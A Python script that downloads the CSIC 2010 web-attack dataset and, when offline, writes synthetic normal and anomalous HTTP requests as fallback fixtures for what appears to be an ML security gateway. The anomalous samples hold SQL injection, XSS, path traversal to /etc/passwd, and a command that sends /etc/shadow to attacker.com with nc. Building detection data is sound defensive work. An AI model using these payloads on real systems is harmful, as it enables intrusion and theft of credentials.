"""
Dataset Downloader & Verifier for CSIC 2010 HTTP Dataset.

Source: Information Security Institute of CSIC (Spanish National Research Council)
Mirror: https://raw.githubusercontent.com/msudol/Web-Application-Attack-Datasets/master/OriginalDataSets/csic_2010/
Files:
  - normalTrafficTraining.txt
  - normalTrafficTest.txt
  - anomalousTrafficTest.txt
"""
import os
import sys
import urllib.request
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("download_dataset")

DATA_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "data"))
BASE_URL = "https://raw.githubusercontent.com/msudol/Web-Application-Attack-Datasets/master/OriginalDataSets/csic_2010/"

DATASET_FILES = [
    "normalTrafficTraining.txt",
    "normalTrafficTest.txt",
    "anomalousTrafficTest.txt"
]

def download_file(filename: str, target_path: str) -> bool:
    url = BASE_URL + filename
    logger.info(f"Downloading {filename} from {url}...")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 AI-Security-Gateway-Downloader"})
        with urllib.request.urlopen(req, timeout=30) as resp, open(target_path, "wb") as out_file:
            data = resp.read()
            out_file.write(data)
            logger.info(f"Successfully downloaded {filename} ({len(data)} bytes).")
            return True
    except Exception as e:
        logger.error(f"Failed to download {filename}: {e}")
        return False

def generate_fallback_offline_samples(data_dir: str):
    """Generates synthetic baseline samples if internet connection is completely offline."""
    logger.warning("Generating local baseline HTTP traffic fixtures for offline operation...")
    
    normal_samples = [
        "GET http://localhost:8080/tienda1/index.jsp HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html\nHost: localhost:8080\n\n",
        "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 32\n\nid=2&nombre=Jamon&precio=85&B1=Ok",
        "GET http://localhost:8080/tienda1/publico/carrito.jsp?action=view HTTP/1.1\nUser-Agent: Mozilla/5.0\nHost: localhost:8080\n\n",
        "GET http://localhost:8080/tienda1/mi_cuenta.jsp?user=alice HTTP/1.1\nUser-Agent: Mozilla/5.0\nHost: localhost:8080\n\n",
        "POST http://localhost:8080/tienda1/login.jsp HTTP/1.1\nUser-Agent: Mozilla/5.0\nContent-Length: 25\n\nuser=testuser&pass=secret12"
    ]
    
    anomalous_samples = [
        "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jamon&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Ok HTTP/1.1\nUser-Agent: Mozilla/5.0\n\n",
        "POST http://localhost:8080/tienda1/login.jsp HTTP/1.1\nUser-Agent: Mozilla/5.0\nContent-Length: 45\n\nuser=admin%27+OR+1%3D1--&pass=anything",
        "GET http://localhost:8080/tienda1/publico/search.jsp?q=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E HTTP/1.1\nUser-Agent: Mozilla/5.0\n\n",
        "GET http://localhost:8080/tienda1/view.jsp?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\nUser-Agent: Mozilla/5.0\n\n",
        "POST http://localhost:8080/tienda1/api/exec HTTP/1.1\nUser-Agent: Mozilla/5.0\nContent-Length: 120\n\ncmd=cat+/etc/shadow%7Cnc+attacker.com+4444"
    ]
    
    os.makedirs(data_dir, exist_ok=True)
    with open(os.path.join(data_dir, "normalTrafficTraining.txt"), "w", encoding="utf-8") as f:
        f.write("\n\n".join(normal_samples * 200))
    with open(os.path.join(data_dir, "normalTrafficTest.txt"), "w", encoding="utf-8") as f:
        f.write("\n\n".join(normal_samples * 50))
    with open(os.path.join(data_dir, "anomalousTrafficTest.txt"), "w", encoding="utf-8") as f:
        f.write("\n\n".join(anomalous_samples * 50))
    logger.info("Local fallback baseline dataset created successfully.")

def main():
    os.makedirs(DATA_DIR, exist_ok=True)
    all_present = all(os.path.exists(os.path.join(DATA_DIR, f)) and os.path.getsize(os.path.join(DATA_DIR, f)) > 0 for f in DATASET_FILES)
    if all_present:
        logger.info("All CSIC 2010 dataset files already exist in ml/data.")
        return 0
    
    success = True
    for filename in DATASET_FILES:
        target_path = os.path.join(DATA_DIR, filename)
        if not os.path.exists(target_path) or os.path.getsize(target_path) == 0:
            if not download_file(filename, target_path):
                success = False
                break
    
    if not success:
        generate_fallback_offline_samples(DATA_DIR)
    
    logger.info("Dataset preparation complete.")
    return 0

if __name__ == "__main__":
    sys.exit(main())
